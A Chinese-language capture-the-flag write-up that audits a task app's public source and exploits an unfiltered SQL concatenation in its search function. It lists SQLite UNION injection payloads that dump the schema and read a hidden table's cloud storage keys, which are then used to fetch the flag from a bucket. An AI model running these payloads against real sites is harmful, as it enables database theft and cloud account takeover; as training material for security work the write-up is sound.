## Tasks wp

信息收集阶段，起手一个登录框，在页头处看到该程序的名称，在页脚处看到开发者的链接

![image-20230612110412171](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306121104372.png)

在开发者的github界面找到该项目源码

![image-20230612110522427](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306121105529.png)

通过审计代码发现一个`sql`语句的直接拼接

![image-20230612062930813](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306120629957.png)

query变量是函数SearchTask的参数，跟踪发现，直接传参，没有任何过滤。![image-20230612063111810](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306120631922.png)

然后看代码程序使用的是sqllite数据库，后面就是sqllite注入的步骤

sql注入第一步先闭合嘛，看代码可以写出如下闭合

```
1%') /*
```

然后根据这句话的sql代码前面部分，看到select 有6字段，用union select的话要相同的嘛，就是

```
1%') union select 1,2,3,4,5,6 /*
```

然后因为我们没有创建对应的sql记录嘛，所以union前面找到的为空，回显为union后的值，可以看到比较明显的输出位在2，所以拿到每个表的创建语句

```
1%') union select 1,(select group_concat(sql) from sqlite_master),3,4,5,6 /*
```

发现有个secret表，在源码中的schema.sql并没有这个表，所以看看咯

![image-20230612113307308](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306121133522.png)

读取字段

```
1%') union select 1,url,3,4,secretId,secretKey from secret /*
```

由url看出是腾讯云的储存桶(什么你看不出来？(:

![image-20230612114415497](https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202306121144612.png)

然后表中也给了ak，阅读腾讯云文档知道可以使用cosbrowser访问储存桶，输入secretId,secretKey，访问其中的flllag文件即可得到flag

![image-20230612063938093](C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20230612063938093.png)
